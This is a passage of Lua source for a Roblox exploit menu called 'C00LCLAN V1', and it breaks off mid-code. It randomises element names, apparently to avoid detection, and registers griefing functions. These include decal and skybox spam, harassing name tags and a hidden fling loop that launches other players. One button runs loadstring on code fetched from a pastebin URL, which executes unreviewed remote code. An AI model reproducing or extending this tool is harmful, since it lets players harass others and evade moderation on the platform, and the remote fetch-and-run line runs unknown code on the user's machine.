--Services
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local PhysicsService = game:GetService("PhysicsService")
local Character       = Player.Character or Player.CharacterAdded:Wait()
local Humanoid        = Character:WaitForChild("Humanoid")
local HRP             = Character:WaitForChild("HumanoidRootPart")
local Mouse           = Player:GetMouse()
local CollectionService = game:GetService("CollectionService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local StarterGui = game:GetService("StarterGui")
local Debris = game:GetService("Debris")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local player = Player

local PlaceId = game.PlaceId
local JobId = game.JobId
--settings
local infjump = false
local invisRunning = false
local noclipOn = false
local noclipConn
local hoverHeight
local bindFrame, bindConn, waitingBindFunction
local customBinds = {}
local infJumpEnabled = false
local infJumpConnection = nil
local espOn = false
local spinOn = false
local spinBAV, lockBP
local savedCFrame
local invisRunning = false
local InvisibleCharacter = nil
local OriginalCharacter = nil
local voidConn = nil
local flyingEnabled = false
local invisRunning = false
local flyBG, flyBV, flyConn
local ray = workspace.CurrentCamera:ScreenPointToRay(Mouse.X, Mouse.Y)
local hit, pos = workspace:FindPartOnRay(ray, Character)
--GUI settings
local GUI_WIDTH     = 400
local GUI_HEIGHT    = 320
local TITLE_HEIGHT  = 30
local NAV_HEIGHT    = 30
local FOOTER_HEIGHT = 30
local GRID_PADDING  = 4
local GRID_COLUMNS  = 4

math.randomseed(os.time())
local character_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

local string_sub = string.sub
local math_random = math.random
local table_concat = table.concat
local character_set_amount = #character_set
local number_one = 1
local default_length = 10



local function generate_string(length)
	local random_string = {}

	for int = number_one, length or default_length do
		local random_number = math_random(number_one, character_set_amount)
		local character = string_sub(character_set, random_number, random_number)

		random_string[#random_string + number_one] = character
	end

	return table_concat(random_string)
end
-- Function manager with descriptions
local FunctionManager = {
	CategorizedFunctions = { All = {} },
	Categories          = { "All" },
	CurrentCategoryIndex= 1,
	Descriptions        = {},
	ISFE = {},
	OnFunctionAdded     = Instance.new("BindableEvent"),
}

function FunctionManager:register(name, callback, category, description, FE)
	category = category or "General"
	if not self.CategorizedFunctions[category] then
		self.CategorizedFunctions[category] = {}
		table.insert(self.Categories, category)
	end
	self.CategorizedFunctions[category][name] = callback
	self.CategorizedFunctions.All[name]        = callback
	self.Descriptions[name]                    = description or ""
	self.ISFE[name]                    = FE or "yes"
	if description == "NOT FE" then
		self.ISFE[name] = "no"
	end
	self.OnFunctionAdded:Fire(category, name, callback)
	self.OnFunctionAdded:Fire("All",      name, callback)
	
end

function FunctionManager:getCurrentCategory()
	return self.Categories[self.CurrentCategoryIndex]
end

function FunctionManager:cycleCategory()
	self.CurrentCategoryIndex = self.CurrentCategoryIndex % #self.Categories + 1
	return self:getCurrentCategory()
end



local screenGui = Instance.new("ScreenGui")
screenGui.Name        = generate_string(math_random(1, 10))
local die = screenGui.Name
screenGui.ResetOnSpawn= false
screenGui.Parent      = PlayerGui
local notificationContainer = Instance.new("Frame")
notificationContainer.Name = "NotificationContainer"
notificationContainer.Size = UDim2.new(1, 0, 1, 0)
notificationContainer.Position = UDim2.new(0, 0, 0, 0)
notificationContainer.BackgroundTransparency = 1
notificationContainer.ZIndex = 100
notificationContainer.Parent = screenGui
local function Notify(text, title, duration)
	duration = duration or 4

	local frame = Instance.new("Frame")
	frame.AnchorPoint = Vector2.new(1, 1)
	frame.Size = UDim2.new(0, 300, 0, 70)
	frame.Position = UDim2.new(1, 320, 1, -10)
	frame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
	frame.BackgroundTransparency = 0
	frame.BorderSizePixel = 0
	frame.ZIndex = 200
	frame.Parent = notificationContainer

	local titleLabel = Instance.new("TextLabel")
	titleLabel.BackgroundTransparency = 1
	titleLabel.Size = UDim2.new(1, -10, 0, 24)
	titleLabel.Position = UDim2.new(0, 5, 0, 4)
	titleLabel.Font = Enum.Font.SourceSansBold
	titleLabel.Text = title or "Notice"
	titleLabel.TextColor3 = Color3.new(1, 1, 1)
	titleLabel.TextSize = 18
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.ZIndex = 201
	titleLabel.Parent = frame

	local bodyLabel = Instance.new("TextLabel")
	bodyLabel.BackgroundTransparency = 1
	bodyLabel.Size = UDim2.new(1, -10, 1, -30)
	bodyLabel.Position = UDim2.new(0, 5, 0, 28)
	bodyLabel.Font = Enum.Font.SourceSans
	bodyLabel.Text = text or ""
	bodyLabel.TextColor3 = Color3.new(1, 1, 1)
	bodyLabel.TextSize = 14
	bodyLabel.TextWrapped = true
	bodyLabel.TextXAlignment = Enum.TextXAlignment.Left
	bodyLabel.ZIndex = 201
	bodyLabel.Parent = frame

	task.defer(function()
		local slideIn = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Position = UDim2.new(1, -10, 1, -10)
		})
		slideIn:Play()
	end)


	task.delay(duration, function()
		local fadeOut = TweenService:Create(frame, TweenInfo.new(0.3), {
			BackgroundTransparency = 1,
			Position = UDim2.new(1, 320, 1, -10)
		})
		local titleFade = TweenService:Create(titleLabel, TweenInfo.new(0.3), {TextTransparency = 1})
		local bodyFade = TweenService:Create(bodyLabel, TweenInfo.new(0.3), {TextTransparency = 1})

		fadeOut:Play()
		titleFade:Play()
		bodyFade:Play()

		fadeOut.Completed:Wait()
		frame:Destroy()
	end)
end




local notificationLayout = Instance.new("UIListLayout")
notificationLayout.SortOrder = Enum.SortOrder.LayoutOrder
notificationLayout.Padding = UDim.new(0, 6)
notificationLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
notificationLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
notificationLayout.Parent = notificationContainer
Notify("Welcome to C00lClan!", "Have fun!", 3)
-- Main frame
local mainFrame = Instance.new("Frame")
mainFrame.Name            = generate_string(math_random(1, 10))
mainFrame.Size            = UDim2.new(0, GUI_WIDTH, 0, GUI_HEIGHT)
mainFrame.Position        = UDim2.new(0.5, -GUI_WIDTH/2, 0.5, -GUI_HEIGHT/2)
mainFrame.BackgroundColor3= Color3.fromRGB(25, 5, 5)
mainFrame.BorderSizePixel = 0
mainFrame.Parent          = screenGui

-- Tooltip
local tooltip = Instance.new("TextLabel", screenGui)
tooltip.Name               = generate_string(math_random(1, 10))
tooltip.Size               = UDim2.new(0, 200, 0, 40)
tooltip.BackgroundColor3   = Color3.fromRGB(30,30,30)
tooltip.BorderSizePixel    = 0
tooltip.Visible            = false
tooltip.ZIndex             = 100
tooltip.ClipsDescendants   = false
tooltip.TextColor3 = Color3.fromRGB(255, 255, 255)
tooltip.TextWrapped = true
-- Title bar
local titleBar = Instance.new("Frame", mainFrame)
titleBar.Name             = generate_string(math_random(1, 10))
titleBar.Size             = UDim2.new(1,0,0,TITLE_HEIGHT)
titleBar.BackgroundColor3 = Color3.fromRGB(60,0,0)
titleBar.BorderSizePixel  = 0

local titleLabel = Instance.new("TextLabel", titleBar)
titleLabel.Size           = UDim2.new(1,-60,1,0)
titleLabel.Position       = UDim2.new(0,4,0,0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text           = "C00LCLAN V1"
titleLabel.Font           = Enum.Font.SourceSansBold
titleLabel.TextSize       = 18
titleLabel.TextColor3     = Color3.new(1,1,1)
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Name           = generate_string(math_random(1, 10))

local minBtn = Instance.new("TextButton", titleBar)
minBtn.Name               = generate_string(math_random(1, 10))
minBtn.Size               = UDim2.new(0,30,1,0)
minBtn.Position           = UDim2.new(1,-30,0,0)
minBtn.Text               = "_"
minBtn.Font               = Enum.Font.SourceSansBold
minBtn.TextSize           = 18
minBtn.TextColor3         = Color3.new(1,1,1)
minBtn.BackgroundColor3   = Color3.fromRGB(80,10,10)
minBtn.BorderSizePixel    = 0

-- Drag logic
local dragging, dragInput, dragStart, startPos = false, nil
local function updateDrag(input)
	local delta = input.Position - dragStart
	mainFrame.Position = startPos + UDim2.new(0, delta.X, 0, delta.Y)
end
titleBar.InputBegan:Connect(function(i)
	if i.UserInputType==Enum.UserInputType.MouseButton1 then
		dragging, dragStart, startPos = true, i.Position, mainFrame.Position
		i.Changed:Connect(function()
			if i.UserInputState==Enum.UserInputState.End then dragging=false end
		end)
	end
end)
titleBar.InputChanged:Connect(function(i)
	if i.UserInputType==Enum.UserInputType.MouseMovement then dragInput=i end
end)
UserInputService.InputChanged:Connect(function(i)
	if i==dragInput and dragging then updateDrag(i) end
end)

-- Category nav
local catNav = Instance.new("Frame", mainFrame)
catNav.Name               = generate_string(math_random(1, 10))
catNav.Size               = UDim2.new(1,0,0,NAV_HEIGHT)
catNav.Position           = UDim2.new(0,0,0,TITLE_HEIGHT)
catNav.BackgroundTransparency = 1

local leftCat = Instance.new("TextButton", catNav)
leftCat.Size              = UDim2.new(0,50,1,0)
leftCat.Text              = "<"
leftCat.Font              = Enum.Font.SourceSansBold
leftCat.TextSize          = 24
leftCat.TextColor3        = Color3.new(1,1,1)
leftCat.BackgroundColor3  = Color3.fromRGB(100,0,0)
leftCat.BorderSizePixel   = 0
leftCat.Name              = generate_string(math_random(1, 10))
local catLabel = Instance.new("TextLabel", catNav)
catLabel.Size             = UDim2.new(1,-100,1,0)
catLabel.Position         = UDim2.new(0,50,0,0)
catLabel.BackgroundTransparency = 1
catLabel.Text             = "All"
catLabel.Font             = Enum.Font.SourceSansBold
catLabel.TextSize         = 18
catLabel.TextColor3       = Color3.new(1,1,1)
catNav.Name               = generate_string(math_random(1, 10))
local rightCat = leftCat:Clone()
rightCat.Parent           = catNav
rightCat.Position         = UDim2.new(1,-50,0,0)
rightCat.Text             = ">"
rightCat.Name = generate_string(math_random(1, 10))

-- Grid
local gridFrame = Instance.new("ScrollingFrame", mainFrame)
gridFrame.Name            = generate_string(math_random(1, 10))
gridFrame.ClipsDescendants= true
gridFrame.Size            = UDim2.new(1,-2*GRID_PADDING,0,GUI_HEIGHT-TITLE_HEIGHT-NAV_HEIGHT-FOOTER_HEIGHT-2*GRID_PADDING)
gridFrame.Position        = UDim2.new(0,GRID_PADDING,0,TITLE_HEIGHT+NAV_HEIGHT+GRID_PADDING)
gridFrame.BackgroundTransparency = 1

local gridLayout = Instance.new("UIGridLayout", gridFrame)
gridLayout.Name           = generate_string(math_random(1, 10))
gridLayout.CellSize       = UDim2.new(0,(GUI_WIDTH-2*GRID_PADDING-(GRID_COLUMNS-1)*GRID_PADDING)/GRID_COLUMNS,0,40)
gridLayout.CellPadding    = UDim2.new(0,GRID_PADDING,0,GRID_PADDING)
gridLayout.SortOrder      = Enum.SortOrder.LayoutOrder

-- Footer
local footer = Instance.new("Frame", mainFrame)
footer.Name               = generate_string(math_random(1, 10))
footer.Size               = UDim2.new(1,0,0,FOOTER_HEIGHT)
footer.Position           = UDim2.new(0,0,1,-FOOTER_HEIGHT)
footer.BackgroundTransparency = 1

local closeBtn = Instance.new("TextButton", footer)
closeBtn.Size             = UDim2.new(1,0,1,0)
closeBtn.Text             = "Close"
closeBtn.Font             = Enum.Font.SourceSansBold
closeBtn.TextSize         = 18
closeBtn.TextColor3       = Color3.new(1,1,1)
closeBtn.BackgroundColor3 = Color3.fromRGB(100,0,0)
closeBtn.BorderSizePixel  = 0
closeBtn.Name             = generate_string(math_random(1, 10))
-- Minimize toggle
local minimized = false
minBtn.MouseButton1Click:Connect(function()
	minimized = not minimized
	if minimized == true then
		mainFrame.BackgroundTransparency = 1
	else
		mainFrame.BackgroundTransparency = 0
	end
	gridFrame.Visible     = not minimized
	catNav.Visible        = not minimized
	footer.Visible        = not minimized
	minBtn.Text           = minimized and "◻" or "_"
end)
local function NotifyERROR(text)
	Notify(text, "ERROR", 3)
end
-- Build the grid and tooltips
local function updateGrid()
	for _, c in ipairs(gridFrame:GetChildren()) do
		if c:IsA("TextButton") then c:Destroy() end
	end
	local cat = FunctionManager:getCurrentCategory()
	catLabel.Text = cat

	for name, cb in pairs(FunctionManager.CategorizedFunctions[cat]) do
		local btn = Instance.new("TextButton")
		local isFE = FunctionManager.ISFE[name]
		btn.Size             = UDim2.new(1,0,0,40)
		btn.BackgroundColor3 = Color3.fromRGB(70,10,10)
		btn.BorderSizePixel  = 0
		btn.Font             = Enum.Font.SourceSansBold
		btn.TextSize         = 16
		btn.TextColor3       = Color3.new(1,1,1)
		btn.Text             = name
		btn.TextWrapped      = true
		btn.Parent           = gridFrame
		btn.Name             = generate_string(math_random(1, 10))
		if isFE == "no" then
			btn.BackgroundColor3 = Color3.fromRGB(72, 100, 87)
		end
		-- tooltip
		local desc = FunctionManager.Descriptions[name]
		
		btn.MouseMoved:Connect(function()
			if desc ~= "" and desc ~= nil then
				tooltip.Text     = desc
				tooltip.Position = UDim2.new(0,Mouse.X,0,Mouse.Y - tooltip.Size.Y.Offset - 4)
				tooltip.Visible = true
			end
		end)
		btn.MouseLeave:Connect(function() tooltip.Visible = false end)

		btn.MouseButton1Click:Connect(function()
			pcall(cb)
		end)
	end
end
local logo = Instance.new("ImageLabel")
logo.Name                 = generate_string(math_random(1, 10))
logo.BackgroundTransparency = 1
logo.Size                 = UDim2.new(1, 0, 0, 100)
logo.Position             = UDim2.new(0, -50, 0, -100)
logo.Image                = "rbxassetid://87486058304609"
logo.ScaleType            = Enum.ScaleType.Fit              
logo.Parent               = mainFrame
-- nav buttons
leftCat.MouseButton1Click:Connect(function()
	FunctionManager.CurrentCategoryIndex = (FunctionManager.CurrentCategoryIndex - 2) % #FunctionManager.Categories + 1
	updateGrid()
end)
rightCat.MouseButton1Click:Connect(function()
	FunctionManager:cycleCategory()
	updateGrid()
end)
closeBtn.MouseButton1Click:Connect(function()
	screenGui:Destroy()
end)
FunctionManager.OnFunctionAdded.Event:Connect(updateGrid)



-- Initialize
updateGrid()

FunctionManager:register("Decal Spam", function()
	local decalID = 8408806737
	local function exPro(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..decalID then
				v.Parent = nil
			elseif v:IsA("BasePart") then
				v.Material = "Plastic"
				v.Transparency = 0
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "http://www.roblox.com/asset/?id="..decalID
				Two.Texture = "http://www.roblox.com/asset/?id="..decalID
				Three.Texture = "http://www.roblox.com/asset/?id="..decalID
				Four.Texture = "http://www.roblox.com/asset/?id="..decalID
				Five.Texture = "http://www.roblox.com/asset/?id="..decalID
				Six.Texture = "http://www.roblox.com/asset/?id="..decalID
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			exPro(v)
		end
	end
	local function asdf(root)
		for _, v in pairs(root:GetChildren()) do
			asdf(v)
		end
	end
	exPro(game.Workspace)
	asdf(game.Workspace)

	local s = Instance.new("Sky")
	s.Name = "Sky"
	s.Parent = game.Lighting
	local skyboxID = 8408806737
	s.SkyboxBk = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxDn = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxFt = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxLf = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxRt = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxUp = "http://www.roblox.com/asset/?id="..skyboxID
	game.Lighting.TimeOfDay = 12

	for i, v in pairs(game.Players:GetChildren()) do
		local emit = Instance.new("ParticleEmitter")
		emit.Parent = v.Character.Torso
		emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
		emit.VelocitySpread = 20
	end
	for i, v in pairs(game.Players:GetChildren()) do
		local emit = Instance.new("ParticleEmitter")
		emit.Parent = v.Character.Torso
		emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
		emit.VelocitySpread = 20
	end
	for i, v in pairs(game.Players:GetChildren()) do
		local emit = Instance.new("ParticleEmitter")
		emit.Parent = v.Character.Torso
		emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
		emit.VelocitySpread = 20
	end
	while true do
		game.Lighting.Ambient = Color3.new(math.random() , math.random() , math.random())
		wait(0.2)
		game.Lighting.ShadowColor = Color3.new(math.random() , math.random() , math.random())
		wait(0.2) 
	end
end, "Troll", "NOT FE")
FunctionManager:register("JOHN DOE", function()

	local redSkyboxAssetId = "rbxassetid://1012887"
	local sky = Lighting:FindFirstChildOfClass("Sky")
	if not sky then
		sky = Instance.new("Sky", Lighting)
	end
	sky.SkyboxBk = redSkyboxAssetId
	sky.SkyboxDn = redSkyboxAssetId
	sky.SkyboxFt = redSkyboxAssetId
	sky.SkyboxLf = redSkyboxAssetId
	sky.SkyboxRt = redSkyboxAssetId
	sky.SkyboxUp = redSkyboxAssetId

	if not ReplicatedStorage:FindFirstChild("juisdfj0i32i0eidsuf0iok") then
		local detection = Instance.new("Decal")
		detection.Name = "juisdfj0i32i0eidsuf0iok"
		detection.Parent = ReplicatedStorage
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "PersistentSoundGui"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = player:WaitForChild("PlayerGui")

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0, 150, 0, 50)
	button.Position = UDim2.new(0.02, 0, 0.477, 0)
	button.Text = "Sound Toggle"
	button.Font = Enum.Font.SourceSansBold
	button.TextSize = 20
	button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Parent = screenGui

	local backgroundSound = SoundService:FindFirstChild("PersistentBGSound")
	if not backgroundSound then
		backgroundSound = Instance.new("Sound")
		backgroundSound.Name = "PersistentBGSound"
		backgroundSound.SoundId = "rbxassetid://19094700"
		backgroundSound.PlaybackSpeed = 0.221
		backgroundSound.Looped = true
		backgroundSound.Volume = 1
		backgroundSound.Parent = SoundService
		backgroundSound:Play()
	end

	button.Activated:Connect(function()
		backgroundSound.Playing = not backgroundSound.Playing
	end)

	local function setupCharacter(character)
		local humanoid = character:WaitForChild("Humanoid")
		local torso = character:WaitForChild("Torso")
		local hrp = character:WaitForChild("HumanoidRootPart")

		local tool = Instance.new("Tool")
		tool.Name = "Slash"
		tool.RequiresHandle = false
		tool.Parent = player.Backpack

		tool.Activated:Connect(function()
			local animation = Instance.new("Animation")
			animation.AnimationId = "rbxassetid://186934658"
			local track = humanoid:LoadAnimation(animation)
			track:Play()
			track:AdjustSpeed(2)

			local s = Instance.new("Sound", torso)
			s.SoundId = "rbxassetid://28144425"
			s:Play()

			task.wait(0.2)

			local s2 = Instance.new("Sound", torso)
			s2.SoundId = "rbxassetid://429400881"
			s2.Volume = 0.2
			s2:Play()
		end)

		local naeeym = Instance.new("BillboardGui", character)
		naeeym.Size = UDim2.new(0, 100, 0, 40)
		naeeym.StudsOffset = Vector3.new(0, 2, 0)
		naeeym.Adornee = character:WaitForChild("Head")

		local tecks = Instance.new("TextLabel", naeeym)
		tecks.BackgroundTransparency = 1
		tecks.BorderSizePixel = 0
		tecks.Font = Enum.Font.Fantasy
		tecks.TextSize = 24
		tecks.TextStrokeTransparency = 0
		tecks.TextStrokeColor3 = Color3.new(0, 0, 0)
		tecks.TextColor3 = Color3.new(0, 0, 0)
		tecks.Size = UDim2.new(1, 0, 0.5, 0)
		tecks.Text = "John Doe"

		local function changeName(newName)
			tecks.Text = newName
		end

		local function shakeTag()
			local originalOffset = naeeym.StudsOffset
			for _ = 1, 10 do
				naeeym.StudsOffset = originalOffset + Vector3.new(math.random(-1,1), math.random(-1,1), math.random(-1,1))
				task.wait(0.05)
			end
			naeeym.StudsOffset = originalOffset
		end

		coroutine.wrap(function()
			while character:IsDescendantOf(workspace) do
				changeName("BURN IN HELL")
				shakeTag()
				task.wait(0.2)
				changeName("STOP")
				task.wait(0.1)
				changeName("JUST GIVE UP")
				shakeTag()
				task.wait(0.2)
				changeName("STOP")
				shakeTag()
				task.wait(0.2)
				changeName("JOHN DOE")
				shakeTag()
				task.wait(0.3)
				changeName("HOPELESS")
				shakeTag()
				task.wait(0.3)
			end
		end)()

		local footPartSize = Vector3.new(10, 0.5, 10)
		local floorPartColor = BrickColor.Black()
		local floorMaterial = Enum.Material.Neon
		local yOffset = -2.8
		local lastPosition = hrp.Position
		local standingTimer = 0

		RunService.Heartbeat:Connect(function(dt)
			if not character:IsDescendantOf(workspace) then return end
			local currentPosition = hrp.Position
			standingTimer += dt
			local distanceMoved = (currentPosition - lastPosition).Magnitude
			local stepPosition = Vector3.new(currentPosition.X, hrp.Position.Y + yOffset, currentPosition.Z)

			local function createFootstep(position)
				local part = Instance.new("Part")
				part.Size = footPartSize
				part.Position = position
				part.Anchored = true
				part.CanCollide = false
				part.BrickColor = floorPartColor
				part.Material = floorMaterial
				part.Transparency = 0.5
				part.Parent = workspace
				task.spawn(function()
					for i = 1, 10 do
						part.Transparency = i * 0.03
						task.wait(0.05)
					end
				end)
				Debris:AddItem(part, 1)
			end

			if distanceMoved > 1 then
				createFootstep(stepPosition)
				lastPosition = currentPosition
				standingTimer = 0
			elseif standingTimer > 0.5 then
				createFootstep(stepPosition)
				standingTimer = 0
			end
		end)

		local movel = 0.1
		local hiddenfling = true

		local function fling()
			while hiddenfling and character:IsDescendantOf(workspace) do
				if hrp then
					local originalVelocity = hrp.Velocity
					hrp.Velocity = originalVelocity * 10000 + Vector3.new(0, 10000, 0)
					RunService.RenderStepped:Wait()
					hrp.Velocity = originalVelocity
					RunService.Stepped:Wait()
					hrp.Velocity = originalVelocity + Vector3.new(0, movel, 0)
					movel = -movel
				end
				RunService.Heartbeat:Wait()
			end
		end
		coroutine.wrap(fling)()
	end

	player.CharacterAdded:Connect(setupCharacter)
	if player.Character then
		setupCharacter(player.Character)
	end

	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")

	local player = Players.LocalPlayer
	local mouse = player:GetMouse()

	local function teleportToMousePosition()
		local character = player.Character
		if not character or not character:FindFirstChild("HumanoidRootPart") then
			return
		end

		local target = mouse.Hit
		if target then
			character:MoveTo(target.Position)
		end
	end

	UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end

		if input.KeyCode == Enum.KeyCode.T then
			teleportToMousePosition()
		end
	end)
end, "Trolling", "BROKEN")
FunctionManager:register("Invis gui", function()
	loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
end, "Trolling", "Credits to the original maker!")
FunctionManager:register("DANCE", function()
	local anim = Instance.new("Animation")
	anim.AnimationId = "rbxassetid://27789359" 
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
	track:Play()
end, "Fun", "DANCE DANCE")
FunctionManager:register("Sound GUI", function()
	local gui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("SoundGui")
	if gui then
		gui:Destroy()
		return
	end
	local SoundGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local AddSoundId = Instance.new("TextButton")
	local SoundIds = Instance.new("TextBox")
	local Default = Instance.new("TextButton")
	local Credits = Instance.new("TextLabel")
	local Title = Instance.new("TextLabel")
	local Swap = Instance.new("ImageButton")
	local PlayBackSpeed = Instance.new("TextBox")
	local Volume = Instance.new("TextBox")
	local Looped = Instance.new("TextBox")
	local Exit = Instance.new("ImageButton")
	local Frame2 = Instance.new("Frame")
	local Open = Instance.new("ImageButton")
	local spoky = Instance.new("Sound")
	local c00lflag = Instance.new("Sound")
	local drag = Instance.new("UIDragDetector")
	drag.Parent = Frame
	c00lflag.Name = "c00lsound23sas"
	c00lflag.Parent = Frame
	spoky.Parent = Frame
	spoky.SoundId = "rbxassetid://95156028272944"
	spoky.Volume = 3
	spoky.PlaybackSpeed = 0.2
	spoky.Name = "spoky"
	--Properties:

	SoundGui.Name = "SoundGui"
	SoundGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	SoundGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	SoundGui.ResetOnSpawn = false

	Frame.Parent = SoundGui
	Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BorderColor3 = Color3.fromRGB(255, 0, 4)
	Frame.BorderSizePixel = 2
	Frame.Position = UDim2.new(0, 700, 0, 300)
	Frame.Size = UDim2.new(0, 398, 0, 206)

	AddSoundId.Name = "AddSoundId"
	AddSoundId.Parent = Frame
	AddSoundId.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	AddSoundId.BorderColor3 = Color3.fromRGB(255, 0, 0)
	AddSoundId.BorderSizePixel = 2
	AddSoundId.Position = UDim2.new(0.118090451, 0, 0.718446612, 0)
	AddSoundId.Size = UDim2.new(0, 307, 0, 36)
	AddSoundId.Font = Enum.Font.Arial
	AddSoundId.Text = "Add Sound!"
	AddSoundId.TextColor3 = Color3.fromRGB(255, 255, 255)
	AddSoundId.TextSize = 29.000

	SoundIds.Name = "SoundIds"
	SoundIds.Parent = Frame
	SoundIds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	SoundIds.BorderColor3 = Color3.fromRGB(255, 0, 0)
	SoundIds.BorderSizePixel = 2
	SoundIds.Position = UDim2.new(0.118090451, 0, 0.305825233, 0)
	SoundIds.Size = UDim2.new(0, 307, 0, 33)
	SoundIds.Font = Enum.Font.Arial
	SoundIds.PlaceholderText = "Add a sound ID here!, No rbx://"
	SoundIds.Text = ""
	SoundIds.TextColor3 = Color3.fromRGB(255, 255, 255)
	SoundIds.TextScaled = true
	SoundIds.TextSize = 14.000
	SoundIds.TextWrapped = true

	Default.Name = "Default"
	Default.Parent = Frame
	Default.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Default.BorderColor3 = Color3.fromRGB(255, 0, 0)
	Default.BorderSizePixel = 2
	Default.Position = UDim2.new(0.118090451, 0, 0.529126227, 0)
	Default.Size = UDim2.new(0, 307, 0, 28)
	Default.Font = Enum.Font.Arial
	Default.Text = "Spooky Scary Skeletons!"
	Default.TextColor3 = Color3.fromRGB(255, 255, 255)
	Default.TextSize = 23.000

	Credits.Name = "Credits"
	Credits.Parent = Frame
	Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Credits.BackgroundTransparency = 1.000
	Credits.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Credits.BorderSizePixel = 0
	Credits.Position = UDim2.new(0.577889442, 0, 0.9174757, 0)
	Credits.Size = UDim2.new(0, 153, 0, 17)
	Credits.Font = Enum.Font.SourceSans
	Credits.Text = "made by: 1known. On discord!"
	Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
	Credits.TextSize = 14.000

	Title.Name = "Title"
	Title.Parent = Frame
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.BorderColor3 = Color3.fromRGB(255, 0, 4)
	Title.BorderSizePixel = 2
	Title.Position = UDim2.new(0.208542719, 0, 0.0291262139, 0)
	Title.Size = UDim2.new(0, 231, 0, 48)
	Title.Font = Enum.Font.Arial
	Title.Text = "c00lSound GUI!"
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextSize = 33.000
	Title.TextWrapped = true

	Swap.Name = "Swap"
	Swap.Parent = Frame
	Swap.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Swap.BorderColor3 = Color3.fromRGB(255, 0, 0)
	Swap.BorderSizePixel = 0
	Swap.Position = UDim2.new(0.904522598, 0, 0.33495146, 0)
	Swap.Size = UDim2.new(0, 23, 0, 21)
	Swap.Image = "rbxassetid://2500573769"

	PlayBackSpeed.Name = "PlayBackSpeed"
	PlayBackSpeed.Parent = Frame
	PlayBackSpeed.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	PlayBackSpeed.BorderColor3 = Color3.fromRGB(255, 0, 0)
	PlayBackSpeed.BorderSizePixel = 2
	PlayBackSpeed.Position = UDim2.new(0.118090451, 0, 0.305825233, 0)
	PlayBackSpeed.Size = UDim2.new(0, 307, 0, 33)
	PlayBackSpeed.Visible = false
	PlayBackSpeed.Font = Enum.Font.Arial
	PlayBackSpeed.PlaceholderText = "Playback speed, Enter a number!"
	PlayBackSpeed.Text = "1"
	PlayBackSpeed.TextColor3 = Color3.fromRGB(255, 255, 255)
	PlayBackSpeed.TextScaled = true
	PlayBackSpeed.TextSize = 14.000
	PlayBackSpeed.TextWrapped = true

	Volume.Name = "Volume"
	Volume.Parent = Frame
	Volume.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Volume.BorderColor3 = Color3.fromRGB(255, 0, 0)
	Volume.BorderSizePixel = 2
	Volume.Position = UDim2.new(0.118090451, 0, 0.305825233, 0)
	Volume.Size = UDim2.new(0, 307, 0, 33)
	Volume.Visible = false
	Volume.Font = Enum.Font.Arial
	Volume.PlaceholderText = "Volume! Enter a number."
	Volume.Text = "0.5"
	Volume.TextColor3 = Color3.fromRGB(255, 255, 255)
	Volume.TextScaled = true
	Volume.TextSize = 14.000
	Volume.TextWrapped = true

	Looped.Name = "Looped"
	Looped.Parent = Frame
	Looped.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Looped.BorderColor3 = Color3.fromRGB(255, 0, 0)
	Looped.BorderSizePixel = 2
	Looped.Position = UDim2.new(0.118090451, 0, 0.305825233, 0)
